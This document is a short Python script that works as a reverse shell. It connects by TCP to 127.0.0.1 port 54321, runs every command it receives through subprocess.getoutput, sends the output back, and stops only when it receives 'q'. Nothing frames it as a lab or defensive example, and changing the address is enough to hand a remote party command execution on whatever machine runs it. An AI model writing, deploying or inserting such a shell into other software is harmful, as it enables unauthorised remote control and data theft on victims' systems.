import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("127.0.0.1", 54321))

def shell():
	while True:
		command = sock.recv(1024).decode()
        
		if command == 'q':
			break
        
		result = subprocess.getoutput(command)
		sock.send(result.encode())

shell()

sock.close()
